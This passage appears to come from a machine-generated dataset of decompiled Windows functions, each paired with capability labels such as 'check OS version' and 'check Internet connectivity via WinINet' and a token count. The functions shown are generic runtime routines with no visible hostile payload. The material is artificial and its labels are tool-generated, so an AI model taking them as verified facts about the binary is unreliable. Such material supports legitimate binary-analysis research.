        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.00418628(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    uVar1 = fcn.00404620();\n    *(in_EAX + 0xc) = uVar1;\n    fcn.00419730();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack36;\n    }\n    return in_EAX;\n}\n",
        "token_count": 195
    },
    "00418770": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00418770(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffed4;\n    uint uStack292;\n    uint uStack288;\n    uchar *puStack284;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack284 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack288 = 0x418820;\n    uStack292 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack292;\n    fcn.00404530();\n    fcn.00405794();\n    iVar1 = fcn.004186c4();\n    if (iVar1 != 0) {\n        var_10ch = var_4h;\n        var_108h._0_1_ = 0xb;\n        in_stack_fffffed4 = 0;\n        fcn.0040dbe4(0, &var_10ch);\n        fcn.00404ec4();\n    }\n    if (*(in_EAX + 4) == 0) {\n        uVar2 = fcn.00404620();\n        *(in_EAX + 4) = uVar2;\n    }\n    fcn.00419730();\n    *in_FS_OFFSET = in_stack_fffffed4;\n    uStack292 = 0x418827;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 348
    },
    "00418874": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00418874(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 0xc) + 8) + -1;\n    if (-1 < iVar2) {\n        do {\n            fcn.00419888();\n            cVar1 = fcn.00418854();\n            if (cVar1 != '\\0') {\n                fcn.0041977c();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    if ((*(in_EAX + 4) != 0) && (iVar2 = *(*(in_EAX + 4) + 8) + -1,  -1 < iVar2)) {\n        do {\n            fcn.00419888();\n            cVar1 = fcn.00418854();\n            if (cVar1 != '\\0') {\n                fcn.0041977c();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    if (*(in_EAX + 8) != NULL) {\n        iVar2 = (**(**(in_EAX + 8) + 0x14))();\n        iVar2 = iVar2 + -1;\n        if (-1 < iVar2) {\n            do {\n                (**(**(in_EAX + 8) + 0x18))();\n                cVar1 = fcn.00418854();\n                if (cVar1 != '\\0') {\n                    (**(**(in_EAX + 8) + 0x48))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != -1);\n        }\n    }\n    return;\n}\n",
        "token_count": 389
    },
    "00418a84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00418a84(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    iVar2 = *(*(in_EAX + 4) + 8);\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar1 = fcn.00419888();\n            if (*(iVar1 + 0x10) != '\\0') {\n                iVar3 = fcn.004186c4();\n            }\n        } while ((iVar3 == 0) && (iVar2 = iVar2 + -1,  iVar2 != 0));\n    }\n    return CONCAT44(param_2, iVar3);\n}\n",
        "token_count": 174
    },
    "00418b58": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00418b58(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = fcn.00418a40();\n    if (iVar2 == 0) {\n        fcn.00418ac8(&stack0xfffffffc);\n    }\n    fcn.0041854c();\n    var_18h = *(*(in_EAX + 4) + 8);\n    if (-1 < var_18h + -1) {\n        do {\n            iVar3 = fcn.00419888();\n            if (((iVar3 != iVar2) && (*(iVar3 + 4) != 0)) && (iVar3 = *(*(iVar3 + 4) + 8) + -1,  -1 < iVar3)) {\n                do {\n                    fcn.00419888();\n                    cVar1 = fcn.0040487c();\n                    if ((cVar1 != '\\0') && (iVar4 = fcn.00418a40(),  iVar4 == iVar2)) {\n                        fcn.0041977c();\n                        fcn.00419730();\n                    }\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != -1);\n            }\n            var_18h = var_18h + -1;\n        } while (var_18h != 0);\n    }\n    return;\n}\n",
        "token_count": 362
    },
    "00418ce8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00418ce8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = *(*(in_EAX + 4) + 8) + -1;\n    if (-1 < iVar2) {\n        do {\n            iVar1 = fcn.00419888();\n            fcn.00418874();\n            if (*(*(iVar1 + 0xc) + 8) == 0) {\n                fcn.00404650();\n                fcn.0041977c();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != -1);\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "00418d38": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418d38(uint arg_8h)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    char in_DL;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_ch;\n    uint var_5h;\n    \n    if (in_DL != '\\0') {\n        puStack48 = 0x418d4d;\n        in_EAX = fcn.00404974();\n    }\n    puStack48 = 0x418d60;\n    fcn.00404620();\n    puStack48 = 0x418d6c;\n    uVar3 = fcn.00404620();\n    *(in_EAX + 4) = uVar3;\n    puStack48 = 0x418d7c;\n    fcn.00418c24();\n    uStack52 = 0x418e37;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    iVar5 = *(*(*0x4979c4 + 4) + 8);\n    puStack48 = &stack0xfffffffc;\n    puVar1 = &stack0xfffffffc;\n    if (-1 < iVar5 + -1) {\n        do {\n            puStack48 = puVar1;\n            fcn.00419888();\n            cVar2 = fcn.0041872c();\n            if (cVar2 != '\\0') {\n                fcn.00419730();\n            }\n            iVar5 = iVar5 + -1;\n            puVar1 = puStack48;\n        } while (iVar5 != 0);\n    }\n    if ((arg_8h != '\\0') && (iVar5 = *(*(*0x4979c4 + 4) + 8),  -1 < iVar5 + -1)) {\n        do {\n            iVar4 = fcn.00419888();\n            if (*(iVar4 + 0x10) != '\\0') {\n                fcn.00419730();\n            }\n            iVar5 = iVar5 + -1;\n        } while (iVar5 != 0);\n    }\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x418e3e;\n    uStack52 = 0x418e36;\n    fcn.00418cdc();\n    return;\n}\n",
        "token_count": 547
    },
    "00418e94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00418e94(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x418eb1;\n    fcn.00418c24();\n    uStack32 = 0x418f0b;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar2 = *(*(in_EAX + 4) + 8);\n    puStack28 = &stack0xfffffffc;\n    if (-1 < iVar2 + -1) {\n        do {\n            fcn.00419888();\n            iVar1 = fcn.004186c4();\n            if (iVar1 != 0) {\n                fcn.00404f70();\n                return iVar1;\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x418f12;\n    uStack32 = 0x418f0a;\n    iVar2 = fcn.00418cdc();\n    return iVar2;\n}\n",
        "token_count": 296
    },
    "0041927c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0041927c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x419294;\n    iVar1 = fcn.00419bf8();\n    uStack28 = 0x4192e6;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    iVar1 = *(iVar1 + 8) + -1;\n    puStack24 = &stack0xfffffffc;\n    if (-1 < iVar1) {\n        do {\n            iVar2 = fcn.00419888();\n            if (in_EAX == *(iVar2 + 4)) {\n                uVar3 = *(iVar2 + 8);\n                fcn.00404f70();\n                return uVar3;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != -1);\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x4192ed;\n    uStack28 = 0x4192e5;\n    uVar3 = fcn.00419c5c();\n    return uVar3;\n}\n",
        "token_count": 304
    },
    "0041937c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041937c(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x4979c8 == 0) {\n        *0x4979c8 = fcn.00404620();\n    }\n    iVar1 = fcn.004198e4();\n    if (iVar1 < 0) {\n        fcn.00419730();\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "004193bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004193bc(void)\n\n{\n    if (*0x4979c8 != 0) {\n        fcn.004199cc();\n    }\n    return;\n}\n",
        "token_count": 39
    },
    "004193d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.004193d4(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    \n    iVar1 = 0;\n    if ((*0x4979c8 != 0) && (iVar3 = *(*0x4979c8 + 8) + -1,  -1 < iVar3)) {\n        do {\n            pcVar2 = fcn.00419888();\n            iVar1 = (*pcVar2)();\n            if (iVar1 != 0) {\n                return iVar1;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != -1);\n    }\n    return iVar1;\n}\n",
        "token_count": 153
    },
    "00419414": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00419414(void)\n\n{\n    uint32_t uVar1;\n    \n    if (*0x4979b4 != NULL) {\n        uVar1 = (**0x4979b4)();\n        return uVar1;\n    }\n    uVar1 = fcn.004193d4();\n    return uVar1 & 0xffffff00 | uVar1 == 0;\n}\n",
        "token_count": 88
    },
    "00419544": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00419544(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    fcn.00407688();\n    fcn.00404650();\n    iVar1 = fcn.00407688();\n    iVar1 = *(iVar1 + 0xc);\n    uVar2 = fcn.00419970();\n    iVar3 = fcn.00407688();\n    *(iVar3 + 8) = uVar2;\n    fcn.0041977c();\n    if (*(iVar1 + 8) == 0) {\n        iVar1 = fcn.00407688();\n        *(iVar1 + 0xc) = 0;\n        fcn.00404650();\n    }\n    return;\n}\n",
        "token_count": 168
    },
    "00419648": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419648(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar *arg_8h;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    char var_ah;\n    uchar var_9h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    puStack20 = 0x41965e;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    (**(**0x4979b0 + 0x14))();\n    uStack24 = 0x4196f6;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    var_ah = *0x41970c == (*(var_4h + 0x1c) & *0x419708);\n    puStack20 = &stack0xfffffffc;\n    if (var_ah) {\n        puStack32 = 0x419693;\n        puStack20 = &stack0xfffffffc;\n        fcn.004194bc();\n    }\n    uStack36 = 0x4196d7;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    fcn.00404528();\n    var_9h = fcn.004195a0(arg_8h);\n    if (var_ah != '\\0') {\n        fcn.00419514();\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x4196de;\n    if (var_ah != '\\0') {\n        uStack36 = 0x4196d6;\n        fcn.00419544();\n    }\n    return;\n}\n",
        "token_count": 444
    },
    "00419cbc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419cbc(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if (param_2 != *(in_EAX + 4)) {\n        if (param_2 < 0) {\n            fcn.00419c98(param_1);\n        }\n        iVar1 = param_2 + 0x1f;\n        if (iVar1 < 0) {\n            iVar1 = param_2 + 0x3e;\n        }\n        iVar1 = (iVar1 >> 5) * 4;\n        iVar2 = *(in_EAX + 4) + 0x1f;\n        if (iVar2 < 0) {\n            iVar2 = *(in_EAX + 4) + 0x3e;\n        }\n        iVar2 = (iVar2 >> 5) * 4;\n        if (iVar2 != iVar1) {\n            iVar3 = 0;\n            if (iVar1 != 0) {\n                iVar3 = fcn.00402f00();\n                fcn.00403af4();\n            }\n            if (iVar2 != 0) {\n                if (iVar3 != 0) {\n                    fcn.00419cb0();\n                    fcn.004030fc();\n                }\n                fcn.00402f1c();\n            }\n            *(in_EAX + 8) = iVar3;\n        }\n        *(in_EAX + 4) = param_2;\n    }\n    return;\n}\n",
        "token_count": 350
    },
    "00419d60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00419d60(char param_1, uint32_t param_2)\n\n{\n    uint8_t *puVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 4) <= param_2) {\n        if (param_2 < 0) {\n            fcn.0040dba8();\n            fcn.00404ec4();\n            return;\n        }\n        fcn.00419cbc();\n    }\n    if (param_1 != '\\0') {\n        puVar1 = *(in_EAX + 8) + (param_2 >> 3);\n        *puVar1 = *puVar1 | '\\x01' << (param_2 & 7);\n        return;\n    }\n    puVar1 = *(in_EAX + 8) + (param_2 >> 3);\n    *puVar1 = *puVar1 & ~('\\x01' << (param_2 & 7));\n    return;\n}\n",
        "token_count": 215
    },
    "00419f20": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00419f89)\n\nvoid fcn.00419f20(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffed4;\n    uint uStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack280 = &stack0xfffffffc;\n    uStack284 = 0x419fb5;\n    uStack288 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack288;\n    fcn.00404530();\n    fcn.00405794();\n    iVar1 = fcn.0040484c();\n    if (iVar1 != 0) {\n        fcn.0040484c();\n        fcn.0040484c();\n    }\n    *in_FS_OFFSET = in_stack_fffffed4;\n    fcn.00405530(0x419fbc);\n    return;\n}\n",
        "token_count": 218
    },
    "0041a0ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041a0ac(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (0 < *(in_EAX[2] + 8)) {\n        puStack16 = 0x41a0c8;\n        (**(*in_EAX + 0x20))();\n        uStack20 = 0x41a106;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        puStack16 = &stack0xfffffffc;\n        while (0 < *(in_EAX[2] + 8)) {\n            fcn.00419970();\n            fcn.00404650();\n        }\n        *in_FS_OFFSET = uStack24;\n        puStack16 = 0x41a10d;\n        uStack20 = 0x41a105;\n        (**(*in_EAX + 0x24))();\n        return;\n    }\n    return;\n}\n",
        "token_count": 238
    },
    "0041a2fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041a2fc(void)\n\n{\n    int32_t *in_EAX;\n    \n    if (in_EAX[4] == 0) {\n        (**(*in_EAX + 0x30))();\n    }\n    in_EAX[4] = in_EAX[4] + 1;\n    return;\n}\n",
        "token_count": 74
    },
    "0041a3b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041a3b8(void)\n\n{\n    int32_t *in_EAX;\n    \n    in_EAX[4] = in_EAX[4] + -1;\n    if (in_EAX[4] == 0) {\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 75
    },
    "0041aca0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0041aca0(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x14) != 0) {\n        (**(**(in_EAX + 0x14) + 0x10))();\n    }\n    fcn.00407024();\n    if (*(in_EAX + 0x14) != 0) {\n        (**(**(in_EAX + 0x14) + 0xc))();\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "0041b3c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b3c4(uint arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t in_EDX;\n    \n    if (*(in_EAX + 9) != '\\0') {\n        fcn.0041a4b0();\n    }\n    if ((in_EDX < 0) || (in_EAX[7] < in_EDX)) {\n        fcn.0041a4b0();\n    }\n    (**(*in_EAX + 0x88))(arg_8h);\n    return;\n}\n",
        "token_count": 124
    },
    "0041b79c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b79c(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t *extraout_ECX;\n    \n    if (arg_ch == -1) {\n        if (0x7fffffff < arg_8h) {\ncode_r0x0041b7b4:\n            if (arg_ch == 0) {\n                if (arg_8h < 0x80000000) goto code_r0x0041b7de;\n            }\n            else if (arg_ch < 1) goto code_r0x0041b7de;\n        }\n    }\n    else if (-2 < arg_ch) goto code_r0x0041b7b4;\n    fcn.0040dba8();\n    fcn.00404ec4();\n    in_EAX = extraout_ECX;\ncode_r0x0041b7de:\n    (**(*in_EAX + 4))();\n    return;\n}\n",
        "token_count": 219
    },
    "0041b83c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041b83c(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t var_20h;\n    int32_t var_1ah;\n    uint *var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t *var_4h;\n    \n    var_14h = &var_20h;\n    var_10h = *(*in_EAX + 0x18);\n    var_4h = in_EAX;\n    var_20h = fcn.00404528();\n    while ((var_20h != 0 && (var_20h != *0x41793c))) {\n        var_20h = fcn.004045dc();\n    }\n    if (var_20h == 0) {\n        fcn.0041b7f0(&stack0xfffffffc);\n    }\n    unique0x00007a00 = *(var_20h + 0x18);\n    if (var_10h == unique0x00007a00) {\n        fcn.0041b7f0(&stack0xfffffffc);\n    }\n    (**(*var_4h + 0x18))(param_2, param_2 >> 0x1f);\n    return;\n}\n",
        "token_count": 292
    },
    "0041b8c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t __cdecl fcn.0041b8c0(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_ch == -1) {\n        if (0x7fffffff < arg_8h) {\ncode_r0x0041b8df:\n            if (arg_ch == 0) {\n                if (arg_8h < 0x80000000) goto code_r0x0041b909;\n            }\n            else if (arg_ch < 1) goto code_r0x0041b909;\n        }\n    }\n    else if (-2 < arg_ch) goto code_r0x0041b8df;\n    fcn.0040dba8();\n    fcn.00404ec4();\ncode_r0x0041b909:\n    iVar1 = (**(*in_EAX + 0x14))();\n    return iVar1;\n}\n",
        "token_count": 225
    },
    "0041b9a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b9a0(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *in_EDX;\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    int64_t iVar2;\n    uint uStackY52;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar2 = CONCAT44(arg_ch, arg_8h);\n    if ((arg_ch == 0) && (iVar2 = CONCAT44(arg_ch, arg_8h),  arg_8h == 0)) {\n        uStackY52 = 0x41b9c5;\n        fcn.0041b724(0, 0);\n        uStackY52 = 0x41b9cb;\n        iVar2 = (***in_EDX)();\n    }\n    arg_ch = iVar2 >> 0x20;\n    arg_8h = iVar2;\n    if (arg_ch == 0) {\n        if (arg_8h < 0xf001) {\ncode_r0x0041b9f9:\n            var_14h = arg_8h;\n            goto code_r0x0041b9ff;\n        }\n    }\n    else if (iVar2 < 0x100000000) goto code_r0x0041b9f9;\n    var_14h = 0xf000;\ncode_r0x0041b9ff:\n    fcn.00402f00();\n    uStackY52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    do {\n        arg_ch = iVar2 >> 0x20;\n        arg_8h = iVar2;\n        if (iVar2 == 0) {\n            *in_FS_OFFSET = uStackY52;\n            fcn.00402f1c();\n            return;\n        }\n        uVar1 = var_14h;\n        if (var_14h >> 0x1f == arg_ch) {\n            if (arg_8h <= var_14h) {\ncode_r0x0041ba31:\n                uVar1 = arg_8h;\n            }\n        }\n        else if (arg_ch <= var_14h >> 0x1f) goto code_r0x0041ba31;\n        fcn.0041b930();\n        fcn.0041b968();\n        iVar2 = iVar2 - uVar1;\n    } while( true );\n}\n",
        "token_count": 554
    },
    "0041bbfc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
